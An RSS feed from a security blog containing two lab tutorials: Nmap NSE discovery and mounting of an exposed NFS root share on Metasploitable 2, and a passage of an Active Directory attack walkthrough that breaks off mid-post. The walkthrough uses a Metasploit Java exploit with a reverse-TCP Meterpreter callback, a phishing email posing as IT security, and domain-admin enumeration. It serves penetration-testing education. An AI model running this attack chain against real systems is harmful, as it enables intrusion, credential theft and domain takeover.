<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Spread Security</title>
    <description>© 2016-2017 Spread Security | All Rights Reserved 
</description>
    <link>https://spreadsecurity.github.io//</link>
    <atom:link href="https://spreadsecurity.github.io//feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 19 Feb 2017 12:38:43 +0100</pubDate>
    <lastBuildDate>Sun, 19 Feb 2017 12:38:43 +0100</lastBuildDate>
    <generator>Jekyll v3.1.6</generator>
    
      <item>
        <title>Nmap Scripting Engine</title>
        <description>&lt;p&gt;In &lt;a href=&quot;https://spreadsecurity.github.io/2016/10/23/port-scanning-with-nmap.html&quot;&gt;this&lt;/a&gt; topic we have seen how Nmap can be used to perform port scanning against a given target.&lt;br /&gt;
Of course, this is just one of the capabilities of this great tool. In fact, another very useful feature is represented by Nmap Scripting Engine (NSE).&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;NSE allows to include scripts, coded with Lua programming language, inside Nmap and run them to perform networking tasks in an autonomous way: this includes discovery, version detection, vulnerability discovery and even exploitation.&lt;/p&gt;

&lt;p&gt;This is the reason why there are different categories for the scripts inside the engine: auth, broadcast, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. For a description of each one, take a look &lt;a href=&quot;https://nmap.org/book/nse-usage.html#nse-categories&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It is possible to check the complete scripts list &lt;a href=&quot;https://nmap.org/nsedoc&quot;&gt;here&lt;/a&gt;. If you are using Kali Linux, the scripts folder is located at &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/nmap/scripts&lt;/code&gt; and scripts have the extensione “.nse”.&lt;br /&gt;
In order to update scripts database, we can just run &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script-updatedb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As the help section reports, to run the engine with a predefined number of scripts, the parameter to use is “-sC”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -h
.....................................................................

SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=&amp;lt;Lua scripts&amp;gt;: &amp;lt;Lua scripts&amp;gt; is a comma separated list of
           directories, script-files or script-categories
  --script-args=&amp;lt;n1=v1,[n2=v2,...]&amp;gt;: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=&amp;lt;Lua scripts&amp;gt;: Show help about scripts.
           &amp;lt;Lua scripts&amp;gt; is a comma-separated list of script-files or
           script-categories.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This will execute all the scripts included in the “default” category against the specified target. It is recommended to use this option with caution, since some of the scripts included in the default category might be particularly intrusive.&lt;/p&gt;

&lt;p&gt;Instead of launching the engine using a particular category, we can run a single script by using the “–script” parameter. This can be done, for example, after a previous scan where we detected an active service on some port that might be of interest.&lt;/p&gt;

&lt;p&gt;Since the best way to understand how a tool works is to practice with it, we will see an example of NSE capabilities using a laboratory environment composed by an attacking Kali Linux machine and a vulnerable target, Metaspoitable 2 VM.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Metasploitable 2: NFS misconfiguration&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Considering the results of the Nmap scan performed on the target in &lt;a href=&quot;https://spreadsecurity.github.io/2016/10/23/port-scanning-with-nmap.html&quot;&gt;this&lt;/a&gt; article, we can take a look at the following services:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE
......................
111/tcp  open  rpcbind
......................
2049/tcp open  nfs
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;NFS means Network File System: this protocol allows, through Remote Procedure Calls (RPC), to share portion of filesystem over a computer network. Since this machine is intentionally vulnerable, the service has been misconfigured on purpose and we can use NSE to detect the misconfiguration.&lt;/p&gt;

&lt;p&gt;The script we are interested in is nfs-ls in the “discovery safe” category; to display the description we just use “–script-help” followed by the name of the script:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap --script-help nfs-ls

Starting Nmap 7.40 ( https://nmap.org ) at 2017-02-18 19:30 CET

nfs-ls
Categories: discovery safe
https://nmap.org/nsedoc/scripts/nfs-ls.html
  Attempts to get useful information about files from NFS exports.
  The output is intended to resemble the output of &amp;lt;code&amp;gt;ls&amp;lt;/code&amp;gt;.

  The script starts by enumerating and mounting the remote NFS exports. After
  that it performs an NFS GETATTR procedure call for each mounted point
  in order to get its ACLs.
  For each mounted directory the script will try to list its file entries
  with their attributes.

  Since the file attributes shown in the results are the result of
  GETATTR, READDIRPLUS, and similar procedures, the attributes
  are the attributes of the local filesystem.

  These access permissions are shown only with NFSv3:
  * Read:     Read data from file or read a directory.
  * Lookup:   Look up a name in a directory
              (no meaning for non-directory objects).
  * Modify:   Rewrite existing file data or modify existing
              directory entries.
  * Extend:   Write new data or add directory entries.
  * Delete:   Delete an existing directory entry.
  * Execute:  Execute file (no meaning for a directory).

  Recursive listing is not implemented.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The target has IP address 192.168.1.100 (discovered, for example, using Netdiscover or Nmap itself), so we can start running the NFS discovery script against the machine.&lt;br /&gt;
In order to trigger as less alerts as possible, it is always a good idea to scan only ports we are focusing on. The port we are interested in is not the one on which runs the NFS service, but the “rpcbind” one: this service performs the task of routing requests between clients and NFS server.&lt;br /&gt;
Then, we can launch Nmap against port 111:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -p 111 --script=nfs-ls 192.168.1.100

Starting Nmap 7.40 ( https://nmap.org ) at 2017-02-19 09:14 CET
Nmap scan report for metasploitable2 (192.168.1.100)
Host is up (0.00012s latency).
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  UID  GID  SIZE   TIME                 FILENAME
| -rwx------  0    0    134    2016-02-27T18:28:03  .7RSS8eUhMslnW9Zc
| drwxr-xr-x  0    0    4096   2012-05-14T03:35:33  bin
| drwxr-xr-x  0    0    4096   2016-03-06T13:45:42  home
| drwxr-xr-x  0    0    4096   2010-03-16T22:57:40  initrd
| lrwxrwxrwx  0    0    32     2010-04-28T20:26:18  initrd.img
| drwxr-xr-x  0    0    4096   2012-05-14T03:35:22  lib
| drwx------  0    0    16384  2010-03-16T22:55:15  lost+found
| drwxr-xr-x  0    0    4096   2010-03-16T22:55:52  media
| drwxr-xr-x  0    0    4096   2010-04-28T20:16:56  mnt
| drwxr-xr-x  0    0    4096   2012-05-14T01:54:53  sbin
|_
MAC Address: 00:0C:29:59:72:BC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As the outputs reports, we have the directory listing, with details about permissions, for the NFS share; the mounting point is the root directory “/” (&lt;code class=&quot;highlighter-rouge&quot;&gt;nfs-ls: Volume /&lt;/code&gt;).&lt;br /&gt;
This can be confirmed with a command for showing mount points:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
root@kali:~# showmount -e 192.168.1.100
Export list for 192.168.1.100:
/ *
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This shows a really bad configuration: NFS service is useful to share portions of the file system to predefined users or groups, but if it is not configured properly it can turn into a huge security risk like in this case where anyone can access the root directory remotely.&lt;/p&gt;

&lt;p&gt;To verify the possibility to mount the volume, we can create a temporary directory and try to mount Metasploitable 2 root directory on it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# mkdir /tmp/nfs

root@kali:~# mount -o nolock -t nfs 192.168.1.100:/ /tmp/nfs

root@kali:~# ls -l /tmp/nfs/
total 160
drwxr-xr-x  2 root root  4096 May 14  2012 bin
drwxr-xr-x  3 root root  4096 Apr 28  2010 boot
lrwxrwxrwx  1 root root    11 Apr 28  2010 cdrom -&amp;gt; media/cdrom
drwxr-xr-x  2 root root  4096 May 20  2012 dev
drwxr-xr-x 95 root root  4096 Feb 19 09:01 etc
drwxr-xr-x  6 root root  4096 Mar  6  2016 home
drwxr-xr-x  2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx  1 root root    32 Apr 28  2010 initrd.img -&amp;gt; boot/initrd.img-2.6.24-16-server
drwxr-xr-x 13 root root  4096 May 14  2012 lib
drwx------  2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x  4 root root  4096 Mar 16  2010 media
drwxr-xr-x  3 root root  4096 Apr 28  2010 mnt
-rw-------  1 root root 65699 Feb 19 09:01 nohup.out
drwxr-xr-x  2 root root  4096 Mar  6  2016 opt
dr-xr-xr-x  2 root root  4096 Apr 28  2010 proc
drwxr-xr-x 13 root root  4096 Feb 19 09:01 root
drwxr-xr-x  2 root root  4096 May 14  2012 sbin
drwxr-xr-x  2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  2 root root  4096 Apr 28  2010 sys
drwxrwxrwt  4 root root  4096 Feb 19 09:01 tmp
drwxr-xr-x 12 root root  4096 Apr 28  2010 usr
drwxr-xr-x 15 root root  4096 May 20  2012 var
lrwxrwxrwx  1 root root    29 Apr 28  2010 vmlinuz -&amp;gt; boot/vmlinuz-2.6.24-16-server

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;“ls -l” shows the mount operation has been executed successfully. Now, we can read or write files in the compromised machine.&lt;br /&gt;
Once we have done with it, we can unmount the volume with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# umount /tmp/nfs
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article we have seen how NSE can be used to discover useful information about the target system. Of course, this is just a simple example to give an idea of what you can do with the engine. Since everyone can contribute to the scripts, this project has a lot of potential because you can write your own code and run it in Nmap.&lt;br /&gt;
Take your time to practice with this powerful tool taking also a look at the other scripts categories.&lt;/p&gt;
</description>
        <pubDate>Sat, 18 Feb 2017 00:00:00 +0100</pubDate>
        <link>https://spreadsecurity.github.io//2017/02/18/nmap-scripting-engine.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2017/02/18/nmap-scripting-engine.html</guid>
        
        <category>Nmap</category>
        
        <category>NSE</category>
        
        <category>Metasploitable 2</category>
        
        <category>Penetration testing</category>
        
        <category>NFS</category>
        
        <category>RPC</category>
        
        
      </item>
    
      <item>
        <title>Attack Simulation: from No Access to Domain Admin</title>
        <description>&lt;p&gt;The main aim of this article is to show how much it is important to keep systems up to date with the latest Security patches; in particular, this post is about Security in corporate Windows environments.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;strong&gt;Active Directory&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Generally, in companies with a discrete number of Windows systems, it is common to set up a domain using a system called Active Directory. Basically it implements a number of processes and services which, among the other things, simplify the management of Windows user accounts inside a domain network so as to handle them in a centralized way.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/active_directory/ad_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A server which runs Active Directory Domain Services takes the name of Domain Controller (DC): through its configuration it is possible to define rules and policies which are applied to users and computers belonging to the domain.&lt;br /&gt;
An account with administrator privileges over the domain belongs to the Domain Admin group: it has administrator rights over all the machines registered to the domain, even on the DC.
Once you have administrator privileges on the domain you can essentially do everything you want; this is why it is important to secure the domain in such a way that only a restricted group of authorized accounts (that really needs them) have those rights.&lt;/p&gt;

&lt;p&gt;Another important aspect about the Domain Controller Security is that, while passwords for local users are stored inside the machine they have been defined in, passwords for domain users are stored on the DC itself.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Virtual Laboratory&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To simulate the attack to the domain, we can setup an Active Directory virtual laboratory environment with a Windows Server 2012 R2 acting as Domain Controller and a Windows 7 SP1 64-bit client in order to emulate an employer workstation registered to the domain.&lt;br /&gt;
On the Windows 7 machine it is installed an old version of Java Runtime Environment, Java 6 Update 23, which is affected by a series of Remote Code Execution (RCE) vulnerabilities; moreover the OS misses a Security patch for MS15-051 vulnerability which allows Local Privilege Escalation.&lt;/p&gt;

&lt;p&gt;The attacker will use the distro Kali Linux on which it is installed by default the notorious Metasploit Framework. After an initial Information Gathering during which he discovers Java 6u23 installation on client workstations, he starts the attack.&lt;/p&gt;

&lt;p&gt;We can begin by launching PostgreSQL service in order to use Metasploit database:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# service postgresql start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Then we can power up Metasploit console:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# msfconsole -q
msf &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Java Client-side Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Among all the vulnerabilities affecting Java 6u23, we can use &lt;em&gt;Java storeImageArray() Invalid Array Indexing Vulnerability&lt;/em&gt;. Through the &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt; command we can take a look at the description that reports a lot of useful informations like the list of platforms affected, reliability Rank, vulnerability disclosure date, module authors, Common Vulnerability and Exposures (CVE) identifier and, of course, the options we need to set up to run the exploit:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/browser/java_storeimagearray 
msf exploit(java_storeimagearray) &amp;gt; info

       Name: Java storeImageArray() Invalid Array Indexing Vulnerability
     Module: exploit/multi/browser/java_storeimagearray
   Platform: Java, Linux, Windows
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2013-08-12

Provided by:
  Unknown
  sinn3r &amp;lt;sinn3r@metasploit.com&amp;gt;
  juan vazquez &amp;lt;juan.vazquez@metasploit.com&amp;gt;

Available targets:
  Id  Name
  --  ----
  0   Generic (Java Payload)
  1   Windows Universal
  2   Linux x86

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT  8080             yes       The local port to listen on.
  SSL      false            no        Negotiate SSL for incoming connections
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                   no        The URI to use for this exploit (default is random)

Payload information:
  Space: 20480
  Avoid: 0 characters

Description:
  This module abuses an Invalid Array Indexing Vulnerability on the 
  static function storeImageArray() function in order to cause a 
  memory corruption and escape the Java Sandbox. The vulnerability 
  affects Java version 7u21 and earlier. The module, which doesn&#39;t 
  bypass click2play, has been tested successfully on Java 7u21 on 
  Windows and Linux systems.

References:
  http://cvedetails.com/cve/2013-2465/
  http://www.osvdb.org/96269
  https://www.exploit-db.com/exploits/27526
  https://packetstormsecurity.com/files/122777
  http://hg.openjdk.java.net/jdk7u/jdk7u-dev/jdk/rev/2a9c79db0040
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This kind of exploits starts a webserver and hosts the malicious code on a webpage, so, when the victim visits the url, it executes.&lt;br /&gt;
Looking at the options, we have to set up the TARGET system, which is Windows, and the URIPATH that represents the last part of the malicious url address.&lt;br /&gt;
Moreover, we need to set the PAYLOAD type, which represents the program we can execute thanks to the RCE vulnerability: it is a good idea to choose Meterpreter payload since it offers a huge quantity of features to control the remote host; furthermore we choose it in order to set up a reverse tcp connection so as to bypass Firewall protection: reverse_tcp Meterpreter.&lt;/p&gt;

&lt;p&gt;Another good payload, which is even more reliable in highly secured environments, is the reverse_http(s) one: in fact, “instead of a stream-based communication model, this stager provides a packet-based transaction system” (take a look to the reference at the end of this article if you want to know more about it). Of course it supports the same features of the reverse_tcp we are using here.&lt;/p&gt;

&lt;p&gt;Once the payload is selected, we set up the IP address (LHOST) and the port (LPORT) to which we want the victim machine connects back to (in this case our host):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(java_storeimagearray) &amp;gt; set target 1
target =&amp;gt; 1
msf exploit(java_storeimagearray) &amp;gt; set uripath /
uripath =&amp;gt; /
msf exploit(java_storeimagearray) &amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp
msf exploit(java_storeimagearray) &amp;gt; set lhost 192.168.1.10
lhost =&amp;gt; 192.168.1.10
msf exploit(java_storeimagearray) &amp;gt; set lport 443
lport =&amp;gt; 443
msf exploit(java_storeimagearray) &amp;gt; show options 

Module options (exploit/multi/browser/java_storeimagearray):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH  /                no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     192.168.1.10     yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows Universal
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;With everything properly configured we can launch the exploit as a background job:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(java_storeimagearray) &amp;gt; exploit -j
[*] Exploit running as background job.
[*] Started reverse TCP handler on 192.168.1.10:443 
[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://192.168.1.10:8080/
[*] Server started.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Social Engineering&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Generally attackers trick victims into opening links by using Social Engineering techniques: for example, a possibility is to send an email to the target by impersonating the company IT Security Team and inviting the user to visit a url in order to download an important Security patch:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/images/active_directory/social_engineering_email.png&quot;&gt;&lt;img src=&quot;/images/active_directory/social_engineering_email.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So, when the victim visits the webpage the Java exploit executes and the attacker obtains a remote connection, i.e., a meterpreter session on the victim machine:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Sending HTML...
[*] Sending .jar file...
[*] Sending .jar file...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/active_directory/java_exploit.png&quot;&gt;&lt;img src=&quot;/images/active_directory/java_exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Sending stage (957999 bytes) to 192.168.1.208
[*] Meterpreter session 1 opened (192.168.1.10:443 -&amp;gt; 192.168.1.208:49163) at 2016-11-16 20:29:32 +0200
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We can then verify the connection by checking active sessions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(java_storeimagearray) &amp;gt; sessions -l

Active sessions
===============

  Id  Type                   Information                Connection
  --  ----                   -----------                ----------
  1   meterpreter x86/win32  NET\testuser1 @ WIN7SP164  192.168.1.10:443 -&amp;gt; 192.168.1.208:49163 (192.168.1.208) 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We have an established connection between the attacker machine with IP address 192.168.1.10 and the victim machine with IP address 192.168.1.208; this connection starts from the victim machine and connects back to the attacker one using port 443. Choosing this port was not random: a connection of this type will be less suspicious since it mimics an ordinary SSL session like if the user is just visiting a webpage in HTTPS.&lt;br /&gt;
Beware that this exploit works both on Internet Explorer (version 8 in this test) and Mozilla Firefox (of course Java plugin must be active).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Post Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Starting the interaction we may want to acquire system informations, like architecture, domain name, user ID and so on; &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; command is what we need:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(java_storeimagearray) &amp;gt; sessions -i 1 
[*] Starting interaction with 1...
meterpreter &amp;gt; sysinfo 
Computer        : WIN7SP164
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
System Language : en_US
Domain          : NET
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter &amp;gt; getuid 
Server username: NET\testuser1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We see that we are controlling a Windows 7 machine and the meterpreter is running inside a process owned by the user “testuser1” which is registered to the domain NET.&lt;br /&gt;
Another interesting information is given by system architecture that is 64-bit while the meterpreter is x86, i.e it is running on a 32-bit process: this means we have to migrate to a 64-bit process in order to use the meterpreter properly.&lt;/p&gt;

&lt;p&gt;Before doing that, we can gather additional informations using Metasploit post exploitation modules. For example, it would be useful to know what kind of privileges the current user has got, like being in the Local Administrators group:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background 
[*] Backgrounding session 1...
msf post(java_storeimagearray) &amp;gt; use post/windows/gather/win_privs 
msf post(win_privs) &amp;gt; info

       Name: Windows Gather Privileges Enumeration
     Module: post/windows/gather/win_privs
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Merlyn Cousins &amp;lt;drforbin6@gmail.com&amp;gt;

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on.

Description:
  This module will print if UAC is enabled, and if the current account 
  is ADMIN enabled. It will also print UID, foreground SESSION ID, is 
  SYSTEM status and current process PRIVILEGES.

msf post(win_privs) &amp;gt; set session 1
session =&amp;gt; 1
msf post(win_privs) &amp;gt; show options 

Module options (post/windows/gather/win_privs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf post(win_privs) &amp;gt; exploit 

Current User
============

 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
 --------  ---------  -----------------------  -----------  -------------  ---
 False     False      False                    True         2              &quot;NET\\testuser1&quot;

Windows Privileges
==================

 Name
 ----
 SeChangeNotifyPrivilege
 SeShutdownPrivilege
 SeUndockPrivilege

[*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As reported the user has not Administration privileges, which means bad news for the attacker: in fact, a good Security practice is to set policies for employers workstations in such a way they do not have local Administrative privileges on their own machine (of course this has also to be followed by the application of Security patches as we will see afterwards).&lt;/p&gt;

&lt;p&gt;Another smart move could be to acquire the IP address of the Domain Controller:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf post(win_privs) &amp;gt; use post/windows/gather/enum_domain
msf post(enum_domain) &amp;gt; info

       Name: Windows Gather Enumerate Domain
     Module: post/windows/gather/enum_domain
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Joshua Abraham &amp;lt;jabra@rapid7.com&amp;gt;

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION  1                yes       The session to run this module on.

Description:
  This module identifies the primary domain via the registry. The 
  registry value used is: 
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group 
  Policy\History\DCName.

msf post(enum_domain) &amp;gt; set session 1
session =&amp;gt; 1
msf post(enum_domain) &amp;gt; exploit 
[+] FOUND Domain: net
[+] FOUND Domain Controller: DC (IP: 192.168.1.200)
[*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Enumerating Domain Admin accounts is for sure a good idea since they are interesting targets due to their privileges:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(enum_domain) &amp;gt; use post/windows/gather/enum_domain_group_users 
msf post(enum_domain_group_users) &amp;gt; info

       Name: Windows Gather Enumerate Domain Group
     Module: post/windows/gather/enum_domain_group_users
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Carlos Perez &amp;lt;carlos_perez@darkoperator.com&amp;gt;
  Stephen Haywood &amp;lt;haywoodsb@gmail.com&amp;gt;

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  GROUP                     yes       Domain Group to enumerate
  SESSION                   yes       The session to run this module on.

Description:
  This module extracts user accounts from specified group and stores 
  the results in the loot. It will also verify if session account is 
  in the group. Data is stored in loot in a format that is compatible 
  with the token_hunter plugin. This module should be run over as 
  session with domain credentials.

msf post(enum_domain_group_users) &amp;gt; set group &quot;domain admins&quot;
group =&amp;gt; domain admins
msf post(enum_domain_group_users) &amp;gt; set session 1 
session =&amp;gt; 1
msf post(enum_domain_group_users) &amp;gt; exploit 

[*] Running module against WIN7SP164
[*] Found users in domain admins
[*] 	NET\boss
[*] Current session running as NET\testuser1 is not a member of domain admins
[*] User list stored in /root/.msf4/loot/20160906195451_default_192.168.1.208_domain.group.mem_774905.txt
[*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The results are telling us that we have only one Domain Admin user: “boss”. Remember this account, because it will be useful later.&lt;br /&gt;
Keep in mind that we could have gathered these informations also by dropping the meterpreter session to a Windows command shell: for example, to find the list of Domain Admins users the command would be &lt;code class=&quot;highlighter-rouge&quot;&gt;net groups &quot;domain admins&quot; /domain&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Going back to the 32/64-bit architecture topic, we need to migrate the meterpreter to a 64-bit process: for this purpose we can list all the processes running on the machine and choose a 64-bit one:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; ps

Process List
============

 PID   PPID  Name               Arch  Session  User           Path
 ---   ----  ----               ----  -------  ----           ----
 0     0     [System Process]                                 
 4     0     System                                           
 252   4     smss.exe                                         
 280   488   svchost.exe                                      
 336   320   csrss.exe                                        
 388   320   wininit.exe                                      
 396   380   csrss.exe                                        
 432   380   winlogon.exe                                     
 488   388   services.exe                                     
 504   388   lsass.exe                                        
 512   388   lsm.exe                                          
 620   488   svchost.exe                                      
 680   488   vmacthlp.exe                                     
 724   488   svchost.exe                                      
 812   488   svchost.exe                                      
 848   488   svchost.exe                                      
 860   488   taskhost.exe       x64   1        NET\testuser1  C:\Windows\System32\taskhost.exe
 872   488   svchost.exe                                      
 928   488   svchost.exe                                      
 1116  488   wmpnetwk.exe                                     
 1152  488   spoolsv.exe                                      
 1188  488   svchost.exe                                      
 1248  488   msdtc.exe                                        
 1308  488   svchost.exe                                      
 1368  488   VGAuthService.exe                                
 1476  488   vmtoolsd.exe                                     
 1532  848   dwm.exe            x64   1        NET\testuser1  C:\Windows\System32\dwm.exe
 1656  488   svchost.exe                                      
 1700  1708  vmtoolsd.exe       x64   1        NET\testuser1  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1708  1664  explorer.exe       x64   1        NET\testuser1  C:\Windows\explorer.exe
 1828  620   WmiPrvSE.exe                                     
 1908  488   dllhost.exe                                      
 1992  156   gEcLfOyZ.exe       x86   1        NET\testuser1  C:\Users\testuser1\AppData\Local\Temp\~spawn4804236038822370445.tmp.dir\gEcLfOyZ.exe
 2188  620   WmiPrvSE.exe                                     
 2376  488   svchost.exe                                      
 2740  488   SearchIndexer.exe 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Note the process with PID 1992 associated to the “.exe” payload file located in the Temp directory: this is the one the meterpreter is currently running on.&lt;br /&gt;
Generally, migrating to “explorer.exe” is a good choice, so we use its PID as parameter to the &lt;code class=&quot;highlighter-rouge&quot;&gt;migrate&lt;/code&gt; command:&lt;/p&gt;

